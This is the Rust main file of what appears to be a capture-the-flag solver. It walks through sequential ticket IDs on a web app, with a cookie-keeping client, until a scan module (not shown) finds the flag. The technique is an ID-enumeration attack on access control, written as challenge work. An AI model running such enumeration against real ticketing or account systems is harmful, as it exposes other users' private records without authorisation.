use clap::Parser;
use reqwest::{Client, Url, redirect::Policy};

#[allow(dead_code)]
mod skipseq;

use skipseq::SkipSeq;

mod scan;

use scan::*;

#[derive(Parser)]
struct Cli {
    /// The URL to the index page.
    index_url: Url,
    /// Maxmimum number of tickets to look at.
    #[arg(default_value_t = usize::MAX)]
    ticket_limit: usize,
    #[arg(short, long)]
    /// Prints information about progress.
    verbose: bool,
}

#[tokio::main]
async fn main() -> Result<(), ScanError> {
    let Cli {
        index_url,
        ticket_limit,
        verbose
    } = Cli::parse();
    // TODO: is cookie store necessary?
    let client = Client::builder()
        .cookie_store(true)
        .redirect(Policy::limited(1))
        .build()
        .expect("Failed to initialize client.");

    let mut checked_ids = SkipSeq::with_capacity(1, 1_000_000);
    loop {
        let next_id = checked_ids.next();
        if next_id > ticket_limit {
            panic!("Failed to find flag in the first {ticket_limit} tickets.");
        } else if verbose {
            println!("Fetching ticket {next_id}");
        }

        match scan(&client, index_url.clone(), next_id).await {
            Ok(Scan::Success { flag, id }) => {
                println!("Found flag: {flag} (ticket #{id})");
                return Ok(());
            }
            Ok(Scan::Failure { username, ids }) => {
                if verbose {
                    println!("Searched user \"{username}\", eliminated {} tickets.", ids.len());
                }
                for id in ids {
                    _ = checked_ids.skip(id);
                }
            }
            Err(e) => return Err(e),
        }
    }
}
